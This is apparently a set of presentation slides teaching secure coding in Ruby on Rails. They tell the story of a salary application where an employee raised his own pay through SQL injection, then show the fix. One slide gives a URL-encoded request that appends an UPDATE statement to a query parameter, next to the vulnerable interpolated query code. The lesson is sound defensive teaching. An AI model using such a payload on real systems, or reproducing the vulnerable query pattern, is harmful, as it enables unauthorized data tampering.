# The Application #

* Some guy is going nuts, he can not handle his company salaries and raises process.
* He contacts you and ask you to build a quite simple application

# And you build it! #

* Awesome, the application works. Everyone is happy. That's it right?

# Day 1 - Injection #

* Early morning call from your customer.
* One employe automagically raised his own salary and was fired... so fix it.

!SLIDE bullets incremental
#Did some research#

* You found that that user used an Injection attack. He modified the query string adding and update statement.
* Query: javascript:alert(escape('1; UPDATE salaries SET amount = 123456789 WHERE user_id = 3;'))
* GET /raises/1
* GET /users/1%3B%20UPDATE%20salaries%20SET%20amount%20%3D%20123456789%20WHERE%20user_id%20%3D%203%3B

#The fix#

* Previously had:
 * @user = User.find(:all, :conditions => "id = #{params[:id]}").first
* Now he have:
 * @user = User.find(params[:id])

!SLIDE bullets incremental
#Sanitize input#

* Use whitelist validation
* Use find, find_by 
 * If you need SQL fragments use:
  * An array of sanitized tainted strings
  * Pass a hash
